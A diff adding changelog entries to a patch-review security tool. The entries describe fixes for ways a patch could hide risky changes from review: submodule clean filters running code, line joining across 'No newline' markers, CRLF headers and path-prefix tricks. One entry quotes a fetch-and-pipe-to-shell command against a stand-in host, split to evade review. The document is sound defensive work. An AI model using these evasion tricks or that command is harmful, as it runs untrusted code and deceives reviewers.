@@ -156,6 +156,43 @@ on [Keep a Changelog](https://keepachangelog.com/), and the project follows
   wall-clock deadline only against hangs. Measured: linear code passes under 64 busy loops
   (20 s wall), and the quadratic import rule it guards against (`eee2b4c^`) still fails at 66.7 s
   of CPU time. Shrinking the lines was rejected: at 20,000 units the quadratic rule took 0.4 s.
+- **A checked-out submodule's own filter no longer runs during working-tree acquisition.**
+  `--ignore-submodules=none` (the H1-02 fix) made `git diff` run `git status` inside each
+  submodule to see whether it was dirty, and that Git read the submodule's configuration
+  (`.git/modules/<name>/config`, or the submodule's own `.git`) and `.gitattributes` and ran its
+  clean filter: DDF turned off only the superproject's filters, so `--git-working-tree`, the
+  daemon and MCP ran code from a repository someone handed you. Acquisition now passes
+  `--ignore-submodules=dirty`: the commit each submodule records is still compared whatever
+  `diff.ignoreSubmodules` or `.gitmodules` say, and Git never runs inside a submodule. A
+  submodule's uncommitted changes, which the superproject never stores, are no longer marked
+  `-dirty`.
+- **A `\ No newline at end of file` marker must end its side of the file.** The marker drops the
+  newline of the line before it, so Git joins the next line of that side onto it: `+cu`, a
+  marker, `+rl -fsSL https://e.example/x | s`, a marker, `+h` was reviewed as three harmless
+  added lines (rank 2) while `git apply` wrote one `curl … | sh` line (rank 5, `network_fetch`).
+  A later line of a side a marker ended, in the same hunk or a later hunk of the file, now
+  refuses the patch with `InvalidEofMarker` at the marker (exit 4). Git's own forms (a marker
+  after the old side's last line, then the new side's lines) still parse.
+- **CRLF patch headers name the paths Git applies.** The parser split lines on LF only, so a
+  header kept its carriage return: `--- /dev/null\r` was not `/dev/null`, and an added
+  `.github/workflows/ci.yml` was reviewed as `modified .github/workflows/ci.yml\r` (rank 5
+  instead of 8, with its `new_file`, `ci_privilege` and `config_or_lockfile` signals lost); a
+  CRLF mode line was refused as an invalid mode. As `git apply` does, the carriage returns ending
+  a header line (`---`, `+++`, extended headers, hunk headers) are now dropped. Body lines keep
+  theirs (content), and a CR inside a quoted name (`"x\r"`) is still part of the path and still
+  `control`.
+- **Header paths lose their first component, as `git apply -p1` strips it.** Only a literal
+  `a/` or `b/` was stripped, so `--- vendor/build.rs` was reviewed as vendored code (rank 5, no
+  `build_hook`) while Git wrote the top-level `build.rs` (rank 9), a `diff.mnemonicPrefix` diff
+  was reviewed as `w/build.rs`, and `diff -ru old/ new/` output kept `new/`. The first component
+  is now stripped whatever it is (a path with no `/` is kept whole), and a `diff --git` line with
+  other prefixes is split where both halves name the same path, as Git splits it.
+- **`rename old`/`rename new` headers are refused.** `git apply` reads them as `rename from`/
+  `rename to`; DDF ignored them, so the rename was reviewed as `modified <new>` with no sign that
+  the old path is removed. No current Git writes them, so they now refuse the patch with
+  `UnsupportedFormat` (exit 4) rather than being translated. A `diff --git a/x b/y` with no
+  rename header at all is still reviewed as `modified y` (open: the direct two-file comparison
+  depends on it, and the model has no old-path field).
 
 ## [0.5.0] - 2026-10-31
 
